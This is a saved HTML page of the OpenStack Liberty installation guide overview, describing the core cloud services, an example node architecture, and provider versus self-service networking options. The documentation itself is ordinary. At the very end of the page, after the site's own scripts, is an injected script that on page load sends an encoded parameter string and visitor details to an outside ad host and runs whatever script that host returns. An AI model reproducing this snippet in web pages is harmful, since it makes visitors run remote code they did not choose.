# OpenStack-Learn
<div class="section" id="overview">
<h1>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h1>
<p>The <a class="reference internal" href="common/glossary.html#term-openstack"><em class="xref std std-term">OpenStack</em></a> project is an open source cloud computing platform that
supports all types of cloud environments. The project aims for simple
implementation, massive scalability, and a rich set of features. Cloud
computing experts from around the world contribute to the project.</p>
<p>OpenStack provides an <a class="reference internal" href="common/glossary.html#term-iaas"><em class="xref std std-term">Infrastructure-as-a-Service (IaaS)</em></a> solution
through a variety of complemental services. Each service offers an
<a class="reference internal" href="common/glossary.html#term-api"><em class="xref std std-term">application programming interface (API)</em></a> that facilitates this
integration.</p>
<p>This guide covers step-by-step deployment of the following major OpenStack
services using a functional example architecture suitable for new users of
OpenStack with sufficient Linux experience:</p>
<table border="1" class="docutils">
<caption><strong>OpenStack services</strong></caption>
<colgroup>
<col width="19%" />
<col width="14%" />
<col width="67%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Service</th>
<th class="head">Project name</th>
<th class="head">Description</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/horizon">Dashboard</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/horizon/">Horizon</a></td>
<td>Provides a web-based self-service portal
to interact with underlying OpenStack services,
such as launching an instance, assigning IP
addresses and configuring access controls.</td>
</tr>
<tr class="row-odd"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/nova">Compute</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/nova/">Nova</a></td>
<td>Manages the lifecycle of compute instances in an
OpenStack environment. Responsibilities include
spawning, scheduling and decommissioning of virtual
machines on demand.</td>
</tr>
<tr class="row-even"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/neutron">Networking</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/neutron/">Neutron</a></td>
<td>Enables Network-Connectivity-as-a-Service for
other OpenStack services, such as OpenStack Compute.
Provides an API for users to define networks and the
attachments into them. Has a pluggable architecture
that supports many popular networking vendors and
technologies.</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
<td><strong>Storage</strong></td>
</tr>
<tr class="row-even"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/swift">Object Storage</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/swift/">Swift</a></td>
<td>Stores and retrieves arbitrary unstructured
data objects via a <a class="reference internal" href="common/glossary.html#term-restful"><em class="xref std std-term">RESTful</em></a>, HTTP based API.
It is highly fault tolerant with its data replication and
scale-out architecture. Its implementation is not like a
file server with mountable directories. In this case,
it writes objects and files to multiple drives, ensuring the
data is replicated across a server cluster.</td>
</tr>
<tr class="row-odd"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/cinder">Block Storage</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/cinder/">Cinder</a></td>
<td>Provides persistent block storage to running instances. Its pluggable
driver architecture facilitates the creation and management of
block storage devices.</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
<td><strong>Shared services</strong></td>
</tr>
<tr class="row-odd"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/keystone">Identity service</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/keystone/">Keystone</a></td>
<td>Provides an authentication and authorization service
for other OpenStack services. Provides a catalog of endpoints
for all OpenStack services.</td>
</tr>
<tr class="row-even"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/glance">Image service</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/glance/">Glance</a></td>
<td>Stores and retrieves virtual machine disk images.
OpenStack Compute makes use of this during instance
provisioning.</td>
</tr>
<tr class="row-odd"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/ceilometer">Telemetry</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/ceilometer/">Ceilometer</a></td>
<td>Monitors and meters the OpenStack cloud for billing, benchmarking,
scalability, and statistical purposes.</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
<td><strong>Higher-level services</strong></td>
</tr>
<tr class="row-odd"><td><a class="reference external" href="http://www.openstack.org/software/releases/liberty/components/heat">Orchestration</a></td>
<td><a class="reference external" href="http://docs.openstack.org/developer/heat/">Heat</a></td>
<td>Orchestrates multiple composite cloud applications by using
either the native <a class="reference internal" href="common/glossary.html#term-heat-orchestration-template-hot"><em class="xref std std-term">HOT</em></a> template
format or the AWS CloudFormation template format, through both an
OpenStack-native REST API and a CloudFormation-compatible
Query API.</td>
</tr>
</tbody>
</table>
<div class="line-block">
<div class="line"><br /></div>
</div>
<p>After becoming familiar with basic installation, configuration, operation,
and troubleshooting of these OpenStack services, you should consider the
following steps toward deployment using a production architecture:</p>
<ul class="simple">
<li>Determine and implement the necessary core and optional services to
meet performance and redundancy requirements.</li>
<li>Increase security using methods such as firewalls, encryption, and
service policies.</li>
<li>Implement a deployment tool such as Ansible, Chef, Puppet, or Salt
to automate deployment and management of the production environment.</li>
</ul>
<div class="section" id="example-architecture">
<span id="overview-example-architectures"></span><h2>Example architecture<a class="headerlink" href="#example-architecture" title="Permalink to this headline">¶</a></h2>
<p>The example architecture requires at least two nodes (hosts) to launch a basic
<a class="reference internal" href="common/glossary.html#term-virtual-machine-vm"><em class="xref std std-term">virtual machine</em></a> or instance. Optional
services such as Block Storage and Object Storage require additional nodes.</p>
<p>This example architecture differs from a minimal production architecture as
follows:</p>
<ul class="simple">
<li>Networking agents reside on the controller node instead of one or more
dedicated network nodes.</li>
<li>Overlay (tunnel) traffic for private networks traverses the management
network instead of a dedicated network.</li>
</ul>
<p>For more information on production architectures, see the
<a class="reference external" href="http://docs.openstack.org/arch-design/content/">Architecture Design Guide</a>,
<a class="reference external" href="http://docs.openstack.org/ops/">Operations Guide</a>, and
<a class="reference external" href="http://docs.openstack.org/liberty/networking-guide/">Networking Guide</a>.</p>
<div class="figure" id="figure-hwreqs">
<img alt="Hardware requirements" src="_images/hwreqs.png" />
<p class="caption"><strong>Hardware requirements</strong></p>
</div>
<div class="section" id="controller">
<h3>Controller<a class="headerlink" href="#controller" title="Permalink to this headline">¶</a></h3>
<p>The controller node runs the Identity service, Image service, management
portions of Compute, management portion of Networking, various Networking
agents, and the dashboard. It also includes supporting services such as
an SQL database, <a class="reference internal" href="common/glossary.html#term-message-queue"><em class="xref std std-term">message queue</em></a>, and <a class="reference internal" href="common/glossary.html#term-ntp"><em class="xref std std-term">NTP</em></a>.</p>
<p>Optionally, the controller node runs portions of Block Storage, Object
Storage, Orchestration, and Telemetry services.</p>
<p>The controller node requires a minimum of two network interfaces.</p>
</div>
<div class="section" id="id1">
<h3>Compute<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<p>The compute node runs the <a class="reference internal" href="common/glossary.html#term-hypervisor"><em class="xref std std-term">hypervisor</em></a> portion of Compute that
operates instances. By default, Compute uses the
<a class="reference internal" href="common/glossary.html#term-kernel-based-vm-kvm"><em class="xref std std-term">KVM</em></a> hypervisor. The compute node also
runs a Networking service agent that connects instances to virtual networks
and provides firewalling services to instances via
<a class="reference internal" href="common/glossary.html#term-security-group"><em class="xref std std-term">security groups</em></a>.</p>
<p>You can deploy more than one compute node. Each node requires a minimum
of two network interfaces.</p>
</div>
<div class="section" id="id2">
<h3>Block Storage<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
<p>The optional Block Storage node contains the disks that the Block
Storage service provisions for instances.</p>
<p>For simplicity, service traffic between compute nodes and this node
uses the management network. Production environments should implement
a separate storage network to increase performance and security.</p>
<p>You can deploy more than one block storage node. Each node requires a
minimum of one network interface.</p>
</div>
<div class="section" id="id3">
<h3>Object Storage<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
<p>The optional Object Storage node contain the disks that the
Object Storage service uses for storing accounts, containers, and
objects.</p>
<p>For simplicity, service traffic between compute nodes and this node
uses the management network. Production environments should implement
a separate storage network to increase performance and security.</p>
<p>This service requires two nodes. Each node requires a minimum of one
network interface. You can deploy more than two object storage nodes.</p>
</div>
</div>
<div class="section" id="id4">
<h2>Networking<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
<p>Choose one of the following virtual networking options.</p>
<div class="section" id="networking-option-1-provider-networks">
<span id="network1"></span><h3>Networking Option 1: Provider networks<a class="headerlink" href="#networking-option-1-provider-networks" title="Permalink to this headline">¶</a></h3>
<p>The provider networks option deploys the OpenStack Networking service
in the simplest way possible with primarily layer-2 (bridging/switching)
services and VLAN segmentation of networks. Essentially, it bridges virtual
networks to physical networks and relies on physical network infrastructure
for layer-3 (routing) services. Additionally, a <a class="reference internal" href="common/glossary.html#term-dhcp"><em class="xref std std-term">DHCP</em></a> service provides
IP address information to instances.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This option lacks support for self-service private networks, layer-3
(routing) services, and advanced services such as <a class="reference internal" href="common/glossary.html#term-lbaas"><em class="xref std std-term">LBaaS</em></a> and
<a class="reference internal" href="common/glossary.html#term-fwaas"><em class="xref std std-term">FWaaS</em></a>. Consider the self-service networks option if you
desire these features.</p>
</div>
<div class="figure" id="figure-network1-services">
<img alt="Networking Option 1: Provider networks - Service layout" src="_images/network1-services.png" />
</div>
</div>
<div class="section" id="networking-option-2-self-service-networks">
<span id="network2"></span><h3>Networking Option 2: Self-service networks<a class="headerlink" href="#networking-option-2-self-service-networks" title="Permalink to this headline">¶</a></h3>
<p>The self-service networks option augments the provider networks option
with layer-3 (routing) services that enable
<a class="reference internal" href="common/glossary.html#term-self-service"><em class="xref std std-term">self-service</em></a> networks using overlay segmentation methods such
as <a class="reference internal" href="common/glossary.html#term-vxlan"><em class="xref std std-term">VXLAN</em></a>. Essentially, it routes virtual networks to physical networks
using <a class="reference internal" href="common/glossary.html#term-nat"><em class="xref std std-term">NAT</em></a>. Additionally, this option provides the foundation
for advanced services such as LBaaS and FWaaS.</p>
<div class="figure" id="figure-network2-services">
<img alt="Networking Option 2: Self-service networks - Service layout" src="_images/network2-services.png" />
</div>
</div>
</div>
</div>


              </div>
            </div>
          </div>
          <div class="docs-actions">
          
            <a href="common/conventions.html"><i class="fa fa-angle-double-left" data-toggle="tooltip" data-placement="top" title="Previous: Conventions"></i></a>
          
          
            <a href="environment.html"><i class="fa fa-angle-double-right" data-toggle="tooltip" data-placement="top" title="Next: Environment"></i></a>
          
            <a id="logABugLink3" href="" target="_blank" title="Found an error? Report a bug against this page"><i class="fa fa-bug" data-toggle="tooltip" data-placement="top" title="Report a Bug"></i></a>
          </div>
          <div class="row docs-byline bottom">
            <div class="docs-updated">updated: 2016-02-26 06:47</div>
          </div>
          <div class="row">
            <div class="col-lg-8 col-md-8 col-sm-8 docs-license">
<a href="https://creativecommons.org/licenses/by/3.0/">
 <img src="_static/images/docs/license.png" alt="Creative Commons Attribution 3.0 License"/>
</a>
<p>
 Except where otherwise noted, this document is licensed under
 <a href="https://creativecommons.org/licenses/by/3.0/">Creative Commons
 Attribution 3.0 License</a>. See all <a href="http://www.openstack.org/legal">
 OpenStack Legal Documents</a>.
</p>
            </div>
            <div class="col-lg-4 col-md-4 col-sm-4 docs-actions-wrapper">
            <!-- ID buglinkbottom added so that pre-filled doc bugs
                 are sent to Launchpad projects related to the document -->
              <a href="#" id="logABugLink2" class="docs-footer-actions"><i class="fa fa-bug"></i> found an error? report a bug</a>
              <a href="http://ask.openstack.org" class="docs-footer-actions"><i class="fa fa-question-circle"></i> questions?</a>
            </div>
          </div>
        </div>
<div class="col-lg-3 col-md-4 col-sm-4 col-lg-pull-9 col-md-pull-8 col-sm-pull-8 docs-sidebar">
  <div class="search-icon show">
    <i class="fa fa-search"></i> Search
  </div>
  <div class="btn-group docs-sidebar-releases">
    <button onclick="location.href='/'" class="btn docs-sidebar-home" data-toggle="tooltip" data-placement="top" title="Docs Home"><i class="fa fa-arrow-circle-o-left"></i></button>
    <button href="#" type="button" data-toggle="dropdown" class="btn docs-sidebar-release-select">Release: Liberty (October 2015)<i class="fa fa-caret-down"></i></button>
    <ul class="dropdown-menu docs-sidebar-dropdown" role="menu" aria-labelledby="dLabel">
      <li role="presentation" class="dropdown-header">Guides</li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#install-guides">Install Guides</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#user-guides">User Guides</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#configuration-guides">Configuration Guides</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#ops-and-admin-guides">Operations And Administration Guides</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#api-guides">API Guides</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/index.html#contributor-guides">Contributor Guides</a></li>
      <li role="presentation" class="dropdown-header">Releases</li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/liberty/">Liberty (current release)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/kilo/">Kilo (April 2015)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/juno/">Juno (October 2014)</a></li>
      <li role="presentation" class="dropdown-header">Languages</li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/ja/">日本語 (Japanese)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/de/">Deutsch (German)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/fr/">Français (French)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/pt_BR/">Português (Portuguese)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/zh_CN/">简体中文 (Simplified Chinese)</a></li>
      <li role="presentation"><a role="menuitem" tabindex="-1" href="http://docs.openstack.org/ko_KR/">한국어 (Korean)</a></li>
    </ul>
  </div>
  <div class="docs-sidebar-toc">
    <div class="docs-sidebar-section" id="table-of-contents">
      <a href="index.html" class="docs-sidebar-section-title"><h4>Contents</h4></a>
      <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="common/conventions.html">Conventions</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="">Overview</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#example-architecture">Example architecture</a></li>
<li class="toctree-l2"><a class="reference internal" href="#id4">Networking</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="environment.html">Environment</a></li>
<li class="toctree-l1"><a class="reference internal" href="keystone.html">Add the Identity service</a></li>
<li class="toctree-l1"><a class="reference internal" href="glance.html">Add the Image service</a></li>
<li class="toctree-l1"><a class="reference internal" href="nova.html">Add the Compute service</a></li>
<li class="toctree-l1"><a class="reference internal" href="neutron.html">Add the Networking service</a></li>
<li class="toctree-l1"><a class="reference internal" href="horizon.html">Add the dashboard</a></li>
<li class="toctree-l1"><a class="reference internal" href="cinder.html">Add the Block Storage service</a></li>
<li class="toctree-l1"><a class="reference internal" href="swift.html">Add the Object Storage service</a></li>
<li class="toctree-l1"><a class="reference internal" href="heat.html">Add the Orchestration service</a></li>
<li class="toctree-l1"><a class="reference internal" href="ceilometer.html">Add the Telemetry service</a></li>
<li class="toctree-l1"><a class="reference internal" href="launch-instance.html">Launch an instance</a></li>
<li class="toctree-l1"><a class="reference internal" href="common/app_support.html">Community support</a></li>
<li class="toctree-l1"><a class="reference internal" href="common/glossary.html">Glossary</a></li>
</ul>

    </div>
  </div>
</div>
      </div>
    </div>
<footer>
  <div class="container">
    <div class="row footer-links">
      <div class="col-lg-2 col-sm-2">
        <h3>OpenStack</h3>
        <ul>
          <li><a href="http://openstack.org/projects/">Projects</a></li>
          <li><a href="http://openstack.org/projects/openstack-security/">OpenStack Security</a></li>
          <li><a href="http://openstack.org/projects/openstack-faq/">Common Questions</a></li>
          <li><a href="http://openstack.org/blog/">Blog</a></li>
          <li><a href="http://openstack.org/news/">News</a></li>
        </ul>
      </div>
      <div class="col-lg-2 col-sm-2">
        <h3>Community</h3>
        <ul>
          <li><a href="http://openstack.org/community/">User Groups</a></li>
          <li><a href="http://openstack.org/community/events/">Events</a></li>
          <li><a href="http://openstack.org/community/jobs/">Jobs</a></li>
          <li><a href="http://openstack.org/foundation/companies/">Companies</a></li>
          <li><a href="http://docs.openstack.org/infra/manual/developers.html">Contribute</a></li>
        </ul>
      </div>
      <div class="col-lg-2 col-sm-2">
        <h3>Documentation</h3>
        <ul>
          <li><a href="http://docs.openstack.org">OpenStack Manuals</a></li>
          <li><a href="http://openstack.org/software/start/">Getting Started</a></li>
          <li><a href="http://developer.openstack.org">API Documentation</a></li>
          <li><a href="https://wiki.openstack.org">Wiki</a></li>
        </ul>
      </div>
      <div class="col-lg-2 col-sm-2">
        <h3>Branding & Legal</h3>
        <ul>
          <li><a href="http://openstack.org/brand/">Logos & Guidelines</a></li>
          <li><a href="http://openstack.org/brand/openstack-trademark-policy/">Trademark Policy</a></li>
          <li><a href="http://openstack.org/privacy/">Privacy Policy</a></li>
          <li><a href="https://wiki.openstack.org/wiki/How_To_Contribute#Contributor_License_Agreement">OpenStack CLA</a></li>
        </ul>
      </div>
      <div class="col-lg-4 col-sm-4">
        <h3>Stay In Touch</h3>
        <a href="https://twitter.com/OpenStack" target="_blank" class="social-icons footer-twitter"></a>
        <a href="https://www.facebook.com/openstack" target="_blank" class="social-icons footer-facebook"></a>
        <a href="https://www.linkedin.com/company/openstack" target="_blank" class="social-icons footer-linkedin"></a>
        <a href="https://www.youtube.com/user/OpenStackFoundation" target="_blank" class="social-icons footer-youtube"></a>
        <p class="fine-print">
          The OpenStack project is provided under the
          <a href="http://www.apache.org/licenses/LICENSE-2.0">Apache 2.0 license</a>. Openstack.org is powered by
          <a href="http://rackspace.com" target="_blank">Rackspace Cloud Computing</a>.
        </p>
      </div>
    </div>
  </div>
</footer>
<div class="footer-bottom">
  <div class="container">
    <form class="form-inline" id="FeedbackForm_FeedbackForm" action="/home/FeedbackForm" method="post" enctype="application/x-www-form-urlencoded">
      <div class="form-group">
        <div>
          <input class="feedback-input" type="input" placeholder="Give Us Your Feedback On This Page">
          <button type="submit" class="feedback-btn">Submit</button>
        </div>
      </div>
    </form>
  </div>
</div>
<!-- jQuery -->
<script type="text/javascript" src="_static/js/jquery-1.11.3.js"></script>

<!-- Bootstrap JavaScript -->
<script type="text/javascript" src="_static/js/bootstrap.min.js"></script>

<!-- The rest of the JS -->
<script type="text/javascript" src="_static/js/navigation.js"></script>

<!-- Docs JS -->
<script type="text/javascript" src="_static/js/docs.js"></script>

<!-- Popovers -->
<script type="text/javascript" src="_static/js/webui-popover.js"></script>

<!-- Javascript for page -->
<script language="JavaScript">
/* build a description of this page including SHA, source location on git repo,
   build time and the project's launchpad bug tag. Set the HREF of the bug
   buttons */

    var lineFeed = "%0A";
    var gitURL = "Source: Can't derive source file URL";

    /* there have been cases where "pagename" wasn't set; better check for it */
        /* The URL of the source file on Git is based on the giturl variable
           in conf.py, which must be manually initialized to the source file
           URL in Git.
           "pagename" is a standard sphinx parameter containing the name of
           the source file, without extension.                             */

        var sourceFile = "overview" + ".rst";
        gitURL = "Source: http://git.openstack.org/cgit/openstack/openstack-manuals/tree/doc/install-guide/source" + "/" + sourceFile;

    /* gitsha, project and bug_tag rely on variables in conf.py */
    var gitSha = "SHA: c2118e3abc167cc3242908de218e9528218266fa";
        var bugProject = "openstack-manuals";
    var bugTitle = "Overview in Installation Guide";
    var fieldTags = "install-guide";

    /* "last_updated" is the build date and time. It relies on the
       conf.py variable "html_last_updated_fmt", which should include
       year/month/day as well as hours and minutes                   */
    var buildstring = "Release: 0.1 on 2016-02-26 06:47";

    var fieldComment = encodeURI(buildstring) +
                       lineFeed + encodeURI(gitSha) +
                       lineFeed + encodeURI(gitURL) ;

    logABug(bugTitle, bugProject, fieldComment, fieldTags);
</script>

<!-- Javascript for search boxes (both sidebar and top nav) -->
<script type="text/javascript">
(function() {
var cx = '000108871792296872333:noj9nikm74i';
var gcse = document.createElement('script');
gcse.type = 'text/javascript';
gcse.async = true;
gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
'//www.google.com/cse/cse.js?cx=' + cx;
var s = document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(gcse, s);
})();
</script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnRlAp1VMvkh3T4mX166V3IUd2TXdCoMpr6vHjsZ8zMF4FmkCvF%2fUEqTaIhFILoP%2bWEAzovkcqLNqoIeNZhbifzOVUy47kl%2b4M%2buEX8G8otWTWCRJSI02L4jyNAmHwp8vIaDZ%2bMQWb%2bTEjL%2bScPQFSQB9m5dzpRu14R8QPC2PLDd0yQmo5yZGcqFp%2bsMU2EuYSaPBP6POTbCNkWBOM0mVTVcvupYfPEVBwaHWsq%2biEyiTA1tNNnN5M8zQ7gOVsJhXdvG34lbs%2bvt43Kqwr4mbjwWLBKpTg4cQuEa6Tn8ze3AbzfYCkRaEi9lMmN6l4IXyZYGxyKwPkCJAiFPAkLzW8M58jZ9bphRAm4iWAerPE52DHgsYs9xKvDLUEs8MucFuHSPhsn09z8zlho4Qf%2bNCCJTI29FNBbalXur8j9uZf58CJ1yQ2x52aPLlrPcRwoI5tOXfqaJiJZihGc5CDmjB8TdFTD21X7qtsIDMuwreqxIOiQ6a%2fpk%2f87WtH5pnqdSAvwwTRW%2bFE1IvqPfLHTcPKAFhiAQL1JxxG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
